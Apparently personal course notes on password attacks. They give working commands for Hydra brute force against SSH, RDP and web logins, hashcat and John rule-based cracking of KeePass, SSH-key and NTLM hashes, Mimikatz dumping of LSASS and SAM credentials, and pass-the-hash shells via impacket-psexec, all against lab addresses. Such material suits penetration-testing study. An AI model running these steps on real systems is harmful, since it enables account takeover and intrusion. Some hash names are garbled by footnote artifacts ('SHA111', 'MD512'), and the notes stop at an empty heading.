Password attacks

--------------------------------------------------------------------------------------------------------------------------------

Attacking Network Services Logins

SSH and RDP

sudo nmap -sV -p 2222 192.168.50.201              -->       Checking if target is running a SSH service

hydra -l username -P /usr/share/wordlists/rockyou.txt -s port ssh://ip_address      -->   brute force against ssh service.

hydra -l nadine -P /usr/share/wordlists/rockyou.txt -s 3389 rdp://192.168.216.227

--------------------------------------------------------------------------------------------------------------------------------

HTTP POST Login Form

hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.239.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

hydra -l admin -P  -f 192.168.239.201 -s 80 http-get /                       --> basic authentication

---------------------------------------------------------------------------------------------------------------------------------

Password Cracking Fundamentals


Encryption

Encryption is a two-way function, in which data is "scrambled" (encrypted) or "unscrambled" (decrypted) with at least one key. 
Encrypted data is known as a ciphertext.

Symmetric encryption 

Symmetric encryption algorithms use the same key for both encryption and decryption. 
To send a message to another person, both sides need to know the key.
The Advanced Encryption Standard (AES) is an example of a symmetric encryption algorithm.

Asymmetric encryption 

Asymmetric encryption uses distinct key pairs containing private and public keys. 
Each user in this transaction has their own key pair. To receive an encrypted message, a user provides their public key to the communication partner, which they use to encrypt their message for us. 
When the message is sent, only the corresponding private key can decrypt the message. 
A common asymmetric encryption algorithm is Rivest–Shamir–Adleman (RSA).

Hash

A hash (or digest) is the result of running variable-sized input data (in this case a plaintext password) through a hash algorithm (such as SHA111 or MD512).

echo -n "secret1" | sha256sum                         -->     converts "secret1" to hash using sha256 algorithm

Calculating the cracking time for password length of 8 with only small and uppercase characters (52 characters in total)
keyspace=52

ALGORITHM	GPU	          CPU
MD5	   68,185.1 MH/s	450.8 MH/s
SHA1	   21,528.2 MH/s	298.3 MH/s
SHA256	   9,276.3 MH/s	        134.2 MH/s

python3 -c "print(keyspace**8)"

python3 -c "print((keyspace**8) / GPUratesofalgorithms)"                --> output will be in seconds.

-----------------------------------------------------------------------------------------------------------------------------------------

Mutating Wordlists

head /usr/share/wordlists/rockyou.txt > demo.txt
sed -i '/^1/d' demo.txt 
cat demo.txt                                                       -->  removing all the passwords starting with "1"

echo \$1 > demo.rule                                               -->  Rule function to add a "1" to all passwords
hashcat -r demo.rule --stdout demo.txt                             -->  Using Hashcat in debugging mode to display all mutated passwords

cat demo1.rule
$1 c

hashcat -r demo1.rule --stdout demo.txt
Password1
Iloveyou1
Princess1
Rockyou1
Abc1231

cat demo2.rule
$1
c

hashcat -r demo2.rule --stdout demo.txt
password1
Password
iloveyou1
Iloveyou
princess1
Princess

cat demo1.rule
$1 c $!

hashcat -r demo1.rule --stdout demo.txt
Password1!
Iloveyou1!
Princess1!
Rockyou1!
Abc1231!

cat demo2.rule
$! $1 c

hashcat -r demo2.rule --stdout demo.txt
Password!1
Iloveyou!1
Princess!1
Rockyou!1
Abc123!1


hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force           -->   Cracking a MD5 Hash with Hashcat and a mutated rockyou.txt wordlist

--------------------------------------------------------------------------------------------------------------------------------------------------------------------

Cracking Methodology

Extract hashes
Format hashes
Calculate the cracking time
Prepare wordlist
Attack the hash


How to identify the hash?

hashid <hash>

hash-identifier

---------------------------------------------------------------------------------------------------------------------------------------------------------------------

Password Manager

Password managers create and store passwords for different services, protecting them with a master password. 
This master password grants access to all passwords held by the password manager. 
Examples of popular password managers are 1Password and KeePass.


Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue                        -->    Searching for KeePass database files

copy the file to kali

ls -la Database.kdbx
keepass2john Database.kdbx > keepass.hash                                                                   -->    Using keepass2john to format the KeePass database for Hashcat
cat keepass.hash 

hashcat --help | grep -i "KeePass"                                                                          -->    Finding the mode of KeePass in Hashcat

hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force     -->   Cracking the KeePass database hash

------------------------------------------------------------------------------------------------------------------------------------------------------------------------

SSH Private Key Passphrase

ssh2john id_rsa > ssh.hash                             -->    Using ssh2john to format the hash

cat ssh.rule
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#                                        -->    Contents of the ssh.rule rules file

cat ssh.passwords

sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'       -->         Adding the named rules to the JtR configuration file

john --wordlist=ssh.passwords --rules=sshRules ssh.hash                           -->         Cracking the hash with JtR to get Passphrase

ssh -i id_rsa -p 2222 dave@192.168.216.201                                        -->         Entering Passphrase to connect to the target system with SSH

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Working with Password Hashes

Cracking NTLM

Windows stores hashed user passwords in the Security Account Manager (SAM)1 database file, which is used to authenticate local or remote users.
The hashes in the SAM are stored as NTLM hashes. NTLM hashes stored in the SAM database are not salted.

We cannot just copy, rename, or move the SAM database from C:\Windows\system32\config\sam 
while the Windows operating system is running because the kernel keeps an exclusive file system lock on the file.


Fortunately, we can use the Mimikatz tool to do the heavy lifting for us and bypass this restriction. 
Mimikatz provides the functionality to extract plain-text passwords and password hashes from various sources in Windows and leverage them in further attacks like pass-the-hash.
Mimikatz also includes the sekurlsa module, which extracts password hashes from the Local Security Authority Subsystem (LSASS) process memory. 
LSASS is a process in Windows that handles user authentication, password changes, and access token creation.

LSASS is important for us because it caches NTLM hashes and other credentials, which we can extract using the sekurlsa Mimikatz module. 
We need to understand that LSASS runs under the SYSTEM user and is therefore even more privileged than a process started as Administrator.

Due to this, we can only extract passwords if we are running Mimikatz as Administrator (or higher) and have the SeDebugPrivilege access right enabled. 
This access right grants us the ability to debug not only processes we own, but also all other users' processes.
 
We can also elevate our privileges to the SYSTEM account with tools like PsExec or the built-in Mimikatz token elevation function to obtain the required privileges. 
The token elevation function requires the SeImpersonatePrivilege access right to work, but all local administrators have it by default.


.\mimikatz.exe                                         -->       Starting Mimikatz

privilege::debug                                       -->       enables SeDebugPrivilege access right
token::elevate                                         -->       elevates to SYSTEM user privileges.
sekurlsa::logonpasswords                               -->       extract plaintext passwords and password hashes from all available sources, ince this generates a huge amount of output, we'll instead use lsadump::sam
lsadump::sam                                           -->       extract the NTLM hashes from the SAM.

cat nelly.hash                                         -->       copy the hash from from lsadump::sam output

hashcat --help | grep -i "ntlm"                        -->       ashcat mode for NTLM hashes

hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force                     -->       NTLM hash of user nelly in nelly.hash and Hashcat mode


-----------------------------------------------------------------------------------------------------------------------------------------------------------------

Passing NTLM

pass-the-hash (PtH) technique.
We can use this technique to authenticate to a local or remote target with a valid combination of username and NTLM hash rather than a plaintext password. 
This is possible because NTLM/LM password hashes are not salted and remain static between sessions.

smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b                            -->      Using smbclient with NTLM hash

impacket-psexec -hashes : 2835573fb334e3696ef62a00e5cf7571  Administrator@192.168.216.211                                          -->      Using psexec to get an interactive shell

-------------------------------------------------------------------------------------------------------------------------------------------------------------------

Cracking Net-NTLMv2





















